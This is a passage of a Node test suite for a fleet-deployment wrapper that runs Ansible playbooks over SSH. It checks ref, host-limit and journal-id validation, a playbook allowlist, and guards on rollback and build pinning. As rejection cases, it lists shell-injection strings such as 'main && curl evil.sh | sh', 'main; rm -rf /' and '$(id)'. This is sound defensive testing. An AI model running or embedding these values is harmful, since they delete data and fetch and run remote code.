/**
 * The ref reaches a remote shell, so its SHAPE is the containment.
 *
 * `ssh` joins its arguments into a single string the remote shell interprets, whatever the local caller
 * passes — so unlike `command: argv:` in Ansible, there is no structural escape here and the value has to
 * be constrained instead. Same rule as `isValidCaptureId`: make the dangerous thing inexpressible rather
 * than trying to reject it, on the machine that holds the fleet SSH key of all places.
 */
import { test } from "node:test";
import assert from "node:assert/strict";

import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";

import { validRef, PLAYBOOKS, LIMIT_PATTERN, SERIAL_PATTERN, PLAYBOOK_TIMEOUT_MS, DEFAULT_PLAYBOOK_TIMEOUT_MS,
  onTheControlPlane, journalScope, controlPlaneCheckout, osRollbackRefusal, staleRefRefusal,
  pinnedBuild, buildOf, buildStates, buildAssertion, buildGate, guestBuilds, linkGate, allowOfflineNames, linkGateFor,
  inventorySources, inventoryReadScript, parseInventoryReads, protocolGuardVerdict }
  from "./fleet-playbook.mjs";
import { CONTROL_PLANE_CHECKOUT_PATH } from "./control-plane-checkout.mjs";
import { protocolVerdict } from "../../worker-fleet/src/protocol-guard.mjs";

test("commits and ordinary branch names are accepted", () => {
  for (const ref of ["afec73d", "65ead9b1c2d3e4f5", "main", "v8-feature-schema", "origin/main", "v1.2.3"]) {
    assert.equal(validRef(ref), true, ref);
  }
});

test("anything that could reach a shell is refused", () => {
  for (const ref of [
    "main; rm -rf /", "main && curl evil.sh | sh", "$(id)", "`id`", "main | tee /etc/passwd",
    "main\nrm -rf /", "main > /etc/cron.d/x", "a'b", 'a"b', "main&", "",
  ]) {
    assert.equal(validRef(ref), false, JSON.stringify(ref));
  }
});

test("path traversal is refused even though slashes are legal in a ref", () => {
  // `origin/main` must work, so slashes cannot simply be banned — which is exactly what makes `..` its
  // own check rather than something the character class already covers.
  assert.equal(validRef("origin/main"), true);
  assert.equal(validRef("../../etc/passwd"), false);
  assert.equal(validRef("main/../../../root"), false);
});

test("an over-long ref is refused, so the bound is real rather than assumed", () => {
  assert.equal(validRef("a".repeat(64)), true);
  assert.equal(validRef("a".repeat(65)), false);
});

test("only the named playbooks are runnable, and they are names rather than paths", () => {
  // The same containment as `-e out=<name>` in lab-job.yml. This value reaches a shell on the box that
  // holds the fleet SSH key, so an arbitrary path here is an arbitrary playbook run against twelve
  // Windows machines.
  // `recover.yml` joined on 2026-09-02 and the addition is deliberate rather than convenient: it kills a
  // node process and REBOOTS, which is the most destructive thing this allowlist permits. It earns that
  // because the fault it exists for cannot be reached any other way — a worker wedged inside a capture
  // does not respond to `Stop-ScheduledTask`, keeps the port, and goes on serving a matching
  // `/health.code` from files the deploy has just updated, so `verify-code.yml`'s reboot never fires.
  // `os-rollback.yml` joined on 2026-09-11 (#921) and displaced `recover.yml` as the most destructive entry:
  // it rolls a box's WINDOWS BUILD back. It earns its place the same way -- a feature update that slipped
  // the appliance policy had no remote repair at all -- and it is fenced harder than anything else here:
  // one named worker or nothing, and a read-only dry run unless `--apply` (tests below).
  // `collect-logs.yml` joined on 2026-09-13 (#1216) and is the LEAST destructive entry, which is why it
  // needs saying rather than passing unremarked: it is READ-ONLY on the guest -- it fetches `server.log`,
  // one rotation back, and NVDA's two logs, and writes only to the control plane. It is in this list
  // because it targets `a11y_workers`, not because it is dangerous: the `lab:*` scripts skip this wrapper
  // because their plays are `hosts: localhost`, and THAT is the line. An allowlist whose membership rule
  // is "how risky does this look" admits the next thing that looks safe.
  //
  // It earns a place at all because `/diagnostics` -- which already serves NVDA's log and `nvda-old.log`
  // -- is an endpoint ON the worker, so it cannot answer for a worker that has died, and `lab:log` and
  // `lab:fetch` are both localhost. This is the only route to a dead worker's `server.log`.
  assert.deepEqual(PLAYBOOKS, ["deploy.yml", "sleep.yml", "provision-role.yml", "recover.yml",
    "inventory-install.yml", "control-host-install.yml", "os-rollback.yml", "collect-logs.yml"]);
  // `provision.yml` stays REFUSED and that is not an oversight: it is the UTM/PowerShell provisioning
  // playbook, a different file from `provision-role.yml`, and only the role one should be reachable from
  // a laptop. Two files one character apart, one allowed and one not, is exactly what an allowlist is for.
  for (const bad of ["../../../etc/evil.yml", "provision.yml", "/tmp/x.yml", "deploy.yml; id"]) {
    assert.equal(PLAYBOOKS.includes(bad), false, bad);
  }
});

test("fleet:wake is deliberately NOT one of these", () => {
  // Wake sends Wake-on-LAN magic packets — UDP broadcasts on the LAN, no SSH — so it runs fine from a
  // laptop and routing it through the control plane would add a hop for nothing. Everything that has to
  // talk TO a worker needs the key, and that is the line this list draws.
  assert.equal(PLAYBOOKS.includes("wake.yml"), false);
});

test("--limit takes worker names, and nothing that could reach a shell", () => {
  for (const ok of ["a11y-worker-3", "a11y-worker-3,a11y-worker-4,a11y-worker-5", "a11y_workers"]) {
    assert.equal(LIMIT_PATTERN.test(ok), true, ok);
  }
  for (const bad of [
    "a11y-worker-3; id", "*", "!a11y-worker-2", "a11y-worker-3 a11y-worker-4", "$(id)",
    "../etc", "a11y-worker-3,", "", "all",
  ]) {
    assert.equal(LIMIT_PATTERN.test(bad), false, JSON.stringify(bad));
  }
});

test("a playbook that installs software gets a budget bigger than the default", () => {
  // `provision-role.yml` installs NVDA and an Edge MSI with `serial: 1`, so five boxes is five sequential
  // installs. At the 30-minute default the SSH is killed mid-provision, which leaves a box half
  // configured and a stamp that may or may not have been written — and `fleet:status` then reports
  // INCONSISTENT, which reads like a provisioning bug rather than a timeout.
  assert.ok(PLAYBOOK_TIMEOUT_MS["provision-role.yml"] > DEFAULT_PLAYBOOK_TIMEOUT_MS,
    "provisioning needs longer than a deploy; a ceiling that expires early turns still-working into failed");
  for (const name of Object.keys(PLAYBOOK_TIMEOUT_MS)) {
    assert.ok(PLAYBOOKS.includes(name), `${name} has a timeout but is not a runnable playbook`);
  }
});

test("provisioning REFUSES a worker mid-capture, rather than serialising around it", () => {
  // The design error this replaced: `serial: 1` carried the comment "matters if a run is in flight
  // against the others", which defends a situation that must never be allowed. Provisioning during a run
  // restarts a worker mid-capture (12–520 s of unresumable work) AND moves provisionRevision on some
  // boxes and not others — a capture cache key and a fleet-consistency MUST_MATCH field. That is a
  // mitigation standing in for a refusal, and `sleep.yml` already had the refusal twenty lines away.
  const play = readFileSync(
    fileURLToPath(new URL("../ansible/provision-role.yml", import.meta.url)), "utf8");
  const executable = play.split("\n").filter((line) => !line.trimStart().startsWith("#")).join("\n");

  assert.match(executable, /provision_busy_check\.json\.busy/,
    "provision-role.yml must ask each worker whether it is capturing before touching it");
  assert.match(executable, /ansible\.builtin\.fail:/,
    "a busy worker must FAIL the play, not be skipped: a partially-provisioned fleet is the INCONSISTENT "
    + "state that stops every capture run, so skipping the busy box is the worst option here");
  // Asked over HTTP from the control plane — the same channel the dispatcher uses — so the two cannot
  // disagree about "busy". Over SSH it would be a different question answered a different way.
  assert.match(executable, /url: "http:\/\/\{\{ ansible_host \}\}:\{\{ a11y_port \}\}\/health"/);
});

test("the provisioning batch size is a choice, contained by shape", () => {
  for (const ok of ["0", "1", "6", "99"]) assert.equal(SERIAL_PATTERN.test(ok), true, ok);
  for (const bad of ["", "-1", "1;id", "$(id)", "100", "01", "1.5", " 1"]) {
    assert.equal(SERIAL_PATTERN.test(bad), false, JSON.stringify(bad));
  }
  const play = readFileSync(
    fileURLToPath(new URL("../ansible/provision-role.yml", import.meta.url)), "utf8");
  assert.match(play, /serial: "\{\{ worker_provision_serial \| default\(1\) \}\}"/,
    "serial must be overridable, and must still default to 1 — fail-fast on a role you just changed");
});

test("the provision stamp is the ENVIRONMENT, not the moment it was applied", () => {
  // `provisionRevision` is a capture cache key AND a fleet-consistency MUST_MATCH field. While it carried
  // a git SHA, any commit — including one touching nothing a capture can observe — changed it, so:
  // re-provisioning after a docs change invalidated every cached capture, and a box provisioned minutes
  // after its peers read INCONSISTENT and blocked every run. Measured 2026-08-25 when a11y-worker-6 failed
  // and could not be re-run alone, because HEAD had moved and four healthy boxes faced re-provisioning.
  //
  // This repo already made the same call one field over: workerCode is deliberately OUTSIDE the cache key
  // because "it changes when a comment changes". A git SHA changes for strictly more reasons.
  const script = readFileSync(fileURLToPath(
    new URL("../../worker-fleet/src/provisioning/stamp-provision-revision.ps1", import.meta.url)), "utf8");
  const code = script.split("\n").filter((line) => !line.trimStart().startsWith("#")).join("\n");

  assert.match(code, /^\$stamp = \$combined$/m,
    "the stamp must be the content hash alone — no SHA, no date, nothing that moves on its own");
  assert.ok(!/\$stamp = "\$\(if \(\$gitSha\)/.test(code),
    "the SHA-prefixed stamp is back; it churns a capture cache key for commits that change nothing");
  // Still RECORDED, because losing it would trade one problem for a diagnostic gap.
  assert.match(code, /provision-commit\.txt/,
    "the commit must still be written somewhere for diagnosis, just not into the key");
});

/**
 * A MACHINE MUST NOT SSH TO ITSELF — and this is how a fleet-bearing pipeline broke.
 *
 * `lab:pipeline` dispatches itself to the control plane as a systemd unit and re-runs there with
 * `--local`, so every stage of a fleet-bearing pipeline executes ON the box this script otherwise SSHes
 * to. Root-to-root over the lab key is not authorised there, and the failure reads `Permission denied
 * (publickey,password)` — which looks like a broken key rather than a machine talking to itself.
 *
 * Measured 2026-08-29: `--pipeline=verify` died at stage 1 of 4 with exactly that, twice, and the second
 * time only because the first failure (a package-name import) had masked it.
 */
test("running ON the control plane is detected, so commands go to a shell and not through ssh", () => {
  const here = { en0: [{ address: "203.0.113.172" }], lo0: [{ address: "127.0.0.1" }] };
  assert.equal(onTheControlPlane(here, "203.0.113.172"), true);
});

test("a laptop on the same LAN is NOT the control plane", () => {
  // The failure that would matter more: deciding we are the control plane when we are not sends every
  // deploy command to the wrong filesystem, silently, and it would look like a checkout that never moved.
  const laptop = { en0: [{ address: "REDACTED-INTERNAL-ADDRESS" }], lo0: [{ address: "127.0.0.1" }] };
  assert.equal(onTheControlPlane(laptop, "203.0.113.172"), false);
});

test("an interface with no address does not throw or match", () => {
  // `networkInterfaces()` returns undefined for an interface in some states, and `.flat()` keeps the hole.
  assert.equal(onTheControlPlane({ en0: undefined, lo0: [{ }] }, "203.0.113.172"), false);
});

test("the journal a deploy streams is bounded to THIS run, not the unit's whole history", () => {
  // `journalctl -u <unit>` returns every run since boot, oldest first. Measured 2026-09-05: a deploy that
  // correctly REFUSED a busy fleet (`failed=1`, `changed=0`) was read as having deployed, because the PLAY
  // RECAP printed above the refusal was the successful run from seven minutes earlier. Same defect
  // CLAUDE.md records as having cost three wrong readings, arriving in the one place with no bound at all.
  assert.equal(journalScope("a11y-fleet-deploy", "3f2a1b9c4d5e6f708192a3b4c5d6e7f8"),
    "_SYSTEMD_INVOCATION_ID=3f2a1b9c4d5e6f708192a3b4c5d6e7f8");
});

test("no InvocationID falls back to the whole unit, because absent must not look like empty", () => {
  // `lab-status.yml` learned this first: scoping on an id a released unit no longer has returned
  // `-- No entries --`, "a status tool showing nothing where there is plenty, which is worse than showing
  // too much". The caller says so in a line of its own when this branch is taken.
  assert.equal(journalScope("a11y-fleet-deploy", ""), "-u a11y-fleet-deploy");
});

test("anything that is not an invocation id is refused, not interpolated", () => {
  // This value reaches a remote shell on the machine holding the fleet SSH key, so the containment is its
  // SHAPE — the same rule `validRef` follows. `systemctl show` returns 32 hex characters or nothing; every
  // other answer is a broken control plane, and a broken control plane must not become a command.
  for (const bad of [
    "; rm -rf /", "$(id)", "`id`", "3f2a1b9c4d5e6f708192a3b4c5d6e7f8 ; id", "abc", "../../etc",
    "3F2A1B9C4D5E6F708192A3B4C5D6E7F8", "3f2a1b9c4d5e6f708192a3b4c5d6e7f",
  ]) {
    assert.equal(journalScope("a11y-fleet-deploy", bad), "-u a11y-fleet-deploy", JSON.stringify(bad));
  }
});

test("THE CONTROL PLANE IS SENT A COMMIT, NEVER A NAME IT WOULD RESOLVE ITSELF (#666)", () => {
  // The whole defect in one assertion. This command used to end `merge --ff-only origin/${ref}`, so the
  // control plane resolved the ref from a fetch it performed SECONDS AFTER the operator resolved it here.
  // Equal only when nothing merged in between — and on 2026-09-09, with main merging every few minutes,
  // three consecutive deploys failed on it while all nine boxes were healthy.
  const command = controlPlaneCheckout("HEAD", "d2729386d6b8807cf610c6e620173930020798a5");

  assert.match(command, /merge --ff-only --quiet d2729386d6b8807cf610c6e620173930020798a5$/,
    `the merge target must be the resolved commit:\n${command}`);
  assert.doesNotMatch(command, /merge[^\n]*origin\//,
    "merging `origin/<ref>` is the bug: it is a second, later resolution of the same question");
});

test("but the CHECKOUT is still a name, because a bare SHA would detach the control plane (#666)", () => {
  // Not symmetry for its own sake. `localBranch()`'s own comment records what a bare SHA costs anything
  // doing `origin/<ref>`, and a detached control plane is a different failure from a stale one. The name
  // selects the branch; the SHA decides where it lands; only the SHA is compared afterwards.
  const command = controlPlaneCheckout("main", "d2729386d6b8807cf610c6e620173930020798a5");

  assert.match(command, /git checkout --quiet main /,
    `the checkout target stays the branch name:\n${command}`);
  assert.match(command, /git fetch --quiet --all/,
    "the fetch has to come first, or the commit is not in the object store to merge to");
  assert.ok(command.indexOf("checkout") < command.indexOf("merge"),
    `checkout must precede merge:\n${command}`);
});

test("`HEAD` is the DEFAULT ref on the checkout this command is meant to be run from (#666)", () => {
  // Why the race is the default path rather than an edge case: `localBranch()` is `rev-parse --abbrev-ref
  // HEAD`, which is the literal string "HEAD" when detached — and the primary checkout is detached by
  // design AND by hook (`post-checkout` puts it back). So the un-flagged deploy sent `origin/HEAD`, main's
  // tip at whatever instant the control plane fetched.
  const command = controlPlaneCheckout("HEAD", "abc1234def5678");

  // `git checkout HEAD` is a deliberate no-op — it is the merge that moves the checkout, and it moves it
  // to one commit rather than to a branch tip that has since advanced.
  assert.match(command, /git checkout --quiet HEAD /, command);
  assert.match(command, /merge --ff-only --quiet abc1234def5678$/, command);
});

test("an OS rollback names exactly ONE worker, and --apply belongs to it alone (#921)", () => {
  // "No --limit" means the whole fleet everywhere else, which is right for a deploy and the one target a
  // Windows rollback must never have. A list is refused too: one box's OS at a time.
  for (const limitFlag of [undefined, "a11y_workers", "a11y-worker-3,a11y-worker-4", ""]) {
    assert.match(osRollbackRefusal({ chosen: "os-rollback.yml", limitFlag, apply: false }) ?? "",
      /without --limit=<one worker>/, JSON.stringify(limitFlag));
  }
  assert.equal(osRollbackRefusal({ chosen: "os-rollback.yml", limitFlag: "a11y-worker-4", apply: false }), null);
  assert.equal(osRollbackRefusal({ chosen: "os-rollback.yml", limitFlag: "a11y-worker-4", apply: true }), null);
  // Accepted and ignored would be the silently-discarded flag this repo refuses everywhere else.
  for (const chosen of PLAYBOOKS.filter((name) => name !== "os-rollback.yml")) {
    assert.match(osRollbackRefusal({ chosen, limitFlag: "a11y-worker-4", apply: true }) ?? "",
      /refusing --apply/, chosen);
    assert.equal(osRollbackRefusal({ chosen, limitFlag: undefined, apply: false }), null, chosen);
  }
  assert.ok(PLAYBOOK_TIMEOUT_MS["os-rollback.yml"] > DEFAULT_PLAYBOOK_TIMEOUT_MS,
    "a rollback runs inside a restart that can take most of an hour; the default ceiling would kill it");
});

test("the rollback playbook refuses before it acts, and its dry run is itself (#921)", () => {
  const play = readFileSync(fileURLToPath(new URL("../ansible/os-rollback.yml", import.meta.url)), "utf8");
  const executable = play.split("\n").filter((line) => !line.trimStart().startsWith("#")).join("\n");
  const at = (pattern: RegExp) => executable.search(pattern);

  // Each guard is present, and each comes BEFORE the first task that changes anything.
  const firstChange = at(/Initiate-OSUninstall/);
  const guards: [string, RegExp][] = [
    ["one host", /ansible_play_hosts_all \| length == 1/],
    ["the others agree on one build", /rollback_fleet_builds \| unique \| length == 1/],
    // AHEAD, not merely different: worker-judge's review found "differs" passed a box one build BEHIND and
    // a box on the same build in another edition, and DISM would have taken either further from the fleet.
    ["the same edition as the fleet", /rollback_this_edition == rollback_fleet_edition/],
    ["a build strictly AHEAD of the fleet's", /rollback_this_number \| int > rollback_fleet_number \| int/],
    ["not mid-capture", /rollback_before\.json\.busy/],
    ["the dry run stops here", /ansible\.builtin\.meta: end_host\s+when: not os_rollback_apply/],
    ["a closed path is refused", /rollback_found\.windowDays \| int > 0/],
  ];
  assert.ok(firstChange > 0, "the playbook must contain the change it guards");
  for (const [name, pattern] of guards) {
    const where = at(pattern);
    assert.ok(where >= 0, `guard missing: ${name}`);
    assert.ok(where < firstChange, `guard AFTER the change it exists to prevent: ${name}`);
  }
  // Busy is asked over HTTP from the control plane, the same channel `deploy.yml` asks on.
  assert.match(executable, /url: "http:\/\/\{\{ ansible_host \}\}:\{\{ a11y_port \}\}\/health"/);
  // The apply switch has exactly one spelling, the one `fleet-playbook.mjs` passes.
  assert.match(executable, /a11y_os_rollback_apply \| default\(false\)/);
  // The proof is the build /health reports afterwards, not DISM's exit code.
  assert.match(executable, /rollback_after\.json\.environment\.windowsVersion/);
  // The restart is not assumed either way: a stage that loses its connection (DISM restarting the box
  // itself) is tolerated, and a restart is asked for only when the box is still there to be asked.
  assert.match(executable, /register: rollback_staged\s+ignore_unreachable: true/);
  assert.match(executable, /when: not \(rollback_staged\.unreachable \| default\(false\)\)/);
});

// --- #971: A REF THAT MEANS SOMETHING DIFFERENT HERE THAN ON ORIGIN ---
//
// `expected` is `git rev-parse <ref>` IN THIS CHECKOUT, and on a machine with worktrees a local branch
// sits wherever the last worktree left it. Measured 2026-09-11: `primary:update` put the local `main` on
// f0d69cb7 at 05:44Z; by the deploy, origin/main was 25a5f680. The control plane shipped f0d69cb7 and THE
// READ-BACK PASSED -- both halves of that check use the same stale SHA, so it is internally consistent and
// a merge behind. `worker:code` found it afterwards as 10 of 10 STALE.
//
// The trap was already written in this file's own comments ("`--ref=main` is not the fix and makes it
// worse") and nothing refused it. These test the refusal, not the comment.
//
// PURE, over two resolved SHAs, and that is the row's own condition: the real deploy path is
// orchestrator's and nobody else runs it. What these CANNOT establish is that the refusal happens before
// anything is shipped -- that is placement in `main` (ahead of `requireCommitIsOnOrigin` and the first
// `ssh`), and asserting it by reading this file's source is the wiring-not-behaviour defect this same file
// records against #645's first attempt. It is stated on the PR rather than faked with a source scrape.

const SHA = (c: string) => c.repeat(40);

test("#971 ACCEPTANCE: a ref resolving to a different commit on origin is REFUSED, naming both SHAs and "
  + "the way out", () => {
  const refusal = staleRefRefusal({ ref: "main", local: "f0d69cb7" + "a".repeat(32),
    origin: "25a5f680" + "b".repeat(32) })!;
  assert.ok(refusal, "a stale local branch must not deploy silently");
  assert.match(refusal, /^REFUSING:/, "the first word must say what happened");
  assert.match(refusal, /f0d69cb7aaaa/, "the SHA it would have shipped");
  assert.match(refusal, /25a5f680bbbb/, "and the SHA origin holds, so the operator can see which is which");
  assert.match(refusal, /npm run primary:update/, "the fix the row asked to be named");
  // BOTH WAYS OUT, not one. A local tip that differs may be BEHIND origin or AHEAD of it, and telling an
  // operator to fast-forward when they meant to ship unpushed work is a refusal that cannot be followed.
  assert.match(refusal, /push it, and pass --ref=/);
});

test("#971: agreement is silent -- the ordinary deploy must not acquire a new way to fail", () => {
  assert.equal(staleRefRefusal({ ref: "main", local: SHA("a"), origin: SHA("a") }), null);
  assert.equal(staleRefRefusal({ ref: "HEAD", local: SHA("b"), origin: SHA("b") }), null,
    "`HEAD` is the DEFAULT ref on the detached primary, which is where this command is meant to be run "
    + "from -- if this ever refused, every ordinary deploy would stop");
});

test("#971: `HEAD` is checked like any other ref, and it is the case that actually bit -- the primary is "
  + "detached by design, so `localBranch()` returns the literal string HEAD", () => {
  const refusal = staleRefRefusal({ ref: "HEAD", local: SHA("d"), origin: SHA("e") })!;
  assert.ok(refusal, "a detached primary behind origin/main is exactly the 2026-09-11 incident");
  assert.match(refusal, /origin\/HEAD/);
});

test("#971: an UNRESOLVABLE `origin/<ref>` is refused, never read as agreement -- could-not-ask answering "
  + "clear is this repository's most expensive recurring shape", () => {
  const refusal = staleRefRefusal({ ref: "local-only", local: SHA("c"), origin: null })!;
  assert.ok(refusal);
  assert.match(refusal, /does not resolve/);
  // AND ITS REMEDIES ARE DIFFERENT ONES. `primary:update` cannot help a branch origin has never seen, so
  // offering it here would be a message that reads like help and is not.
  assert.match(refusal, /git push -u origin local-only/);
  assert.doesNotMatch(refusal, /To deploy origin's tip/,
    "the stale-branch remedy must not be pasted onto a case it cannot fix");
});

test("#971: both SHAs are column-aligned, and a long ref name degrades rather than throwing", () => {
  const lines = staleRefRefusal({ ref: "main", local: SHA("1"), origin: SHA("2") })!.split("\n");
  const local = lines.find((l) => l.includes("this checkout"))!;
  const origin = lines.find((l) => l.includes("origin/main:"))!;
  assert.equal(local.indexOf(SHA("1").slice(0, 12)), origin.indexOf(SHA("2").slice(0, 12)),
    "the two SHAs must start in the same column -- the eye lands on the digits that differ");
  const long = "agent/" + "x".repeat(60);
  assert.doesNotThrow(() => staleRefRefusal({ ref: long, local: SHA("1"), origin: SHA("2") }),
    "a negative repeat count would throw; alignment is cosmetic and must degrade, never fail");
});

test("#971: the comparison is on the resolved COMMITS, so an abbreviated SHA is not equal to its full "
  + "form -- `git rev-parse` gives both sides the full 40, and anything shorter reaching here is a bug "
  + "this must not paper over", () => {
  assert.ok(staleRefRefusal({ ref: "main", local: SHA("a"), origin: SHA("a").slice(0, 12) }),
    "two spellings of the same commit must still refuse -- equality here is the whole check, and "
    + "accepting a prefix would make it a substring test that passes on any shared prefix");
});

// ---------------------------------------------------------------------------------------------------
// #1084: `fleet:provision` asserts the guest build against the PINNED image.
//
// A feature update reached `a11y-worker-4` and landed at a reboot. The appliance policy stops a mid-run
// reboot; it does not stop an update installing and arriving later. **The OS is a capture-cache key**
// precisely so two builds never blend evidence into one corpus — so one box drifting costs that box, and
// the same drift on any box costs a corpus.
//
// Split from #921, whose acceptance is a run against the real fleet. THIS half is pure: the comparison
// and its message. The live confirmation stays on #921 where `orchestrator` can run it.
// ---------------------------------------------------------------------------------------------------

/** The two builds from the #921 incident, used as data. Neither appears in `fleet-playbook.mjs`. */
const PIN = "10.0.22631";
const DRIFTED = "10.0.26200";
const reported = (build: string) => `Microsoft Windows 11 Pro ${build}`;

test("#1084 ACCEPTANCE: a box on a different build is REFUSED, naming the box and BOTH builds", () => {
  const { refusal, notice } = buildAssertion({ guests: [
    { name: "a11y-worker-2", windowsVersion: reported(PIN) },
    { name: "a11y-worker-4", windowsVersion: reported(DRIFTED) },
  ], pinned: PIN });

  assert.ok(refusal, "a build mismatch must REFUSE. A warning is not the acceptance: the pin is a "
    + "MUST_MATCH cache key, and `provisionRevision`'s own design is that a canary box IS the failure mode");
  assert.match(refusal, /a11y-worker-4/, "the refusal must name the box");
  assert.match(refusal, new RegExp(DRIFTED.replace(/\./g, "\\.")), "and the build it is ON");
  assert.match(refusal, new RegExp(PIN.replace(/\./g, "\\.")), "and the build it SHOULD be on -- "
    + "\"a box has drifted\" without the two values is not something anybody can act on");
  assert.equal(notice, null, "a refusal is not also a notice");
});

test("#1084: a drifted box is named for REBUILD, and never reported as repaired", () => {
  // `fleet:provision` installs the ROLE, not the OS. A line saying a box is "now compliant" would be a
  // claim provisioning cannot make true, and a provision step that "fixed" a build would be silently
  // reinstalling an operating system under a capture run.
  const { refusal } = buildAssertion({
    guests: [{ name: "a11y-worker-4", windowsVersion: reported(DRIFTED) }], pinned: PIN });
  assert.match(String(refusal), /REBUILD/, "the instruction must be a rebuild");
  assert.match(String(refusal), /installs the ROLE, not the OS/,
    "and it must say WHY, or the next reader tries to make provisioning do it");
  assert.doesNotMatch(String(refusal), /\b(repaired|now compliant|fixed)\b/i,
    "\"needs a rebuild\" and \"is now compliant\" are different instructions and one of them is a lie");
});

test("#1084: a box whose build cannot be READ is a third state, not folded into either", () => {
  // "Could not ask" and "the answer is no" must not render the same. Folding these into `drifted` sends
  // somebody to rebuild a box that may be fine; folding them into `compliant` hides the box that is not.
  const states = buildStates([
    { name: "on-the-pin", windowsVersion: reported(PIN) },
    { name: "drifted", windowsVersion: reported(DRIFTED) },
    { name: "silent", windowsVersion: null },
    { name: "unparseable", windowsVersion: "Windows, version unknown" },
  ], PIN);

  assert.deepEqual(states.compliant, ["on-the-pin"]);
  assert.deepEqual(states.drifted.map((d) => d.name), ["drifted"]);
  assert.deepEqual(states.unreadable, ["silent", "unparseable"],
    "a reading with no build-shaped token is unreadable, never a guess");

  const { refusal } = buildAssertion({ guests: [
    { name: "drifted", windowsVersion: reported(DRIFTED) },
    { name: "silent", windowsVersion: null },
  ], pinned: PIN });
  assert.match(String(refusal), /COULD NOT READ the build of silent/,
    "and the unreadable box is SAID, not dropped from the output because something else failed");
});

test("#1084: a clean run still says what it EXAMINED — zero drifted is not zero asked", () => {
  const clean = buildAssertion({
    guests: [{ name: "a11y-worker-2", windowsVersion: reported(PIN) }], pinned: PIN });
  assert.equal(clean.refusal, null, "nothing drifted, so nothing is refused");
  assert.match(String(clean.notice), /1 on the pin, 0 drifted, 0 unreadable, of 1 asked/,
    "the census is printed whatever the verdict");

  const nothing = buildAssertion({ guests: [], pinned: PIN });
  assert.match(String(nothing.notice), /of 0 asked/,
    "\"no box drifted\" and \"no box was asked\" are different facts and a bare clean verdict spells "
    + "them the same");
});

test("#1084: NO PIN DECLARED is a fourth state — loud, and not a clean result", () => {
  // MEASURED 2026-09-12 on `31611ef4`: the inventory declares no pin, so this is today's fleet rather
  // than a hypothetical. It does not refuse: provisioning is how a drifted fleet gets its role back, and
  // a guard that refuses every run until a file on the control plane is edited bricks the repair path.
  const { refusal, notice } = buildAssertion({
    guests: [{ name: "a11y-worker-2", windowsVersion: reported(PIN) }], pinned: null });
  assert.equal(refusal, null, "an undeclared pin must not brick the repair path");
  assert.match(String(notice), /NO PINNED IMAGE/, "but it must be said on every run");
  assert.match(String(notice), /windows_build/,
    "and it must name the key to add -- follow the message exactly and you must pass");
  assert.match(String(notice), /NOT a clean result/,
    "because the one thing it must never read as is agreement");
});

/** The pin declared under the worker group's `vars:`, at the indent a real inventory uses. */
const workerGroup = (body: string) => `all:\n  children:\n    a11y_workers:\n      vars:\n${body}`;

test("#1084: the pin is READ FROM the inventory, in either quoting, and absent reads as absent", () => {
  const withPin = workerGroup(`        windows_build: "${PIN}"\n`);
  assert.equal(pinnedBuild(withPin), PIN);
  assert.equal(pinnedBuild(withPin.replace(`"${PIN}"`, PIN)), PIN, "unquoted is the same declaration");
  assert.equal(pinnedBuild("all:\n  children:\n    a11y_workers:\n      hosts:\n        w2:\n"), null,
    "and an inventory with no such key declares no pin, rather than an empty one");
  assert.equal(buildOf(reported(PIN)), PIN);
  assert.equal(buildOf("Windows, version unknown"), null);
});

test("#1091 REVIEW: a TRAILING COMMENT is part of the declaration, not a different line", () => {
  // worker-judge's blocker, and it failed to the branch that deliberately does not refuse: a pinned fleet
  // would compare nothing while the notice said the inventory declares no pin -- FALSE about the file,
  // and the notice is an instruction, so it would send somebody to add a key already there.
  //
  // The natural way anyone records a pinned OS build is with the reason beside it: it is the one value
  // whose *why* costs a corpus. And `pinnedBuild`'s own header argues for text-parsing precisely because
  // "half the value of `inventory.yml` is its comments".
  assert.equal(pinnedBuild(workerGroup(`        windows_build: "${PIN}"  # the pin, #921\n`)), PIN,
    "a quoted value with a trailing comment is still a declaration");
  assert.equal(pinnedBuild(workerGroup(`        windows_build: ${PIN} # why this build\n`)), PIN,
    "and unquoted with one too");

  // THE MIRROR, and it is why the comment is allowed only AFTER the value: a COMMENTED-OUT declaration
  // must read as no pin. Reading it would be the fixture-naming-the-thing trap one level out -- the text
  // is present, the declaration is not.
  assert.equal(pinnedBuild(workerGroup(`        # windows_build: "${PIN}"\n`)), null,
    "a commented-out pin is not a pin, however much of the line survives");
});

test("#1091 REVIEW: the pin is SCOPED to the worker group, because the message says it is", () => {
  // A `windows_build` under `a11y_lab`, or at column 0, read as the FLEET pin -- and with `/m` and `exec`
  // the tiebreak was FILE ORDER. `groupPerLine` is imported rather than re-derived, which is the call
  // `fleet-discover.mjs` already made: a second group parser there once reported the lab container as a
  // fifth worker.
  assert.equal(pinnedBuild(`windows_build: "${PIN}"\n`), null,
    "a declaration in no group is not the worker group's");
  assert.equal(pinnedBuild(`all:\n  children:\n    a11y_lab:\n      vars:\n        windows_build: "9.9.9"\n`),
    null, "and another group's build is not the fleet's, whatever it says");
  assert.equal(pinnedBuild(`all:\n  children:\n    a11y_lab:\n      vars:\n        windows_build: "9.9.9"\n`
    + `    a11y_workers:\n      vars:\n        windows_build: "${PIN}"\n`), PIN,
    "and with a decoy FIRST in the file, the worker group's is still the one read -- file order was the "
    + "old tiebreak and it must not be the new one");
});

test("#1091 REVIEW: `buildOf` reads a THREE-part version, and the limit is stated rather than hidden", () => {
  // worker-judge's note. `Win32_OperatingSystem.Version` is `<major>.<minor>.<build>` and every real value
  // in this tree is three-part, so this is a stated bound and not a live defect: a four-part value
  // carrying a UBR would have its revision dropped silently. Pinned here so the day a worker starts
  // reporting one, this fails rather than comparing a truncated value against a full one.
  assert.equal(buildOf(reported(PIN)), PIN, "the three-part shape every real reading uses");
  assert.equal(buildOf(`Microsoft Windows 11 Pro ${PIN}.1742`), PIN,
    "A FOUR-PART VALUE LOSES ITS REVISION. If a worker ever reports one, widen this and the pin together "
    + "-- comparing a truncated reading against a full pin would refuse every box at once");
});

test("#1084: the pinned build is NOT restated in the source — a second copy of the cache key", () => {
  // A build written into `fleet-playbook.mjs` would be the fact-stated-twice defect on the one value
  // where it costs a corpus: the inventory and the assertion could then disagree, and the assertion
  // would win silently.
  const source = readFileSync(fileURLToPath(new URL("./fleet-playbook.mjs", import.meta.url)), "utf8");
  const buildLiteral = /\b\d+\.\d+\.\d{4,}\b/;
  assert.doesNotMatch(source, buildLiteral,
    "fleet-playbook.mjs states a Windows build literal -- the pin is read from the inventory, never "
    + "restated here");
  // The control on the pattern: it must be able to find one, or the assertion above passes because the
  // regex is broken rather than because the source is clean.
  assert.match(`the pinned image is ${PIN}`, buildLiteral,
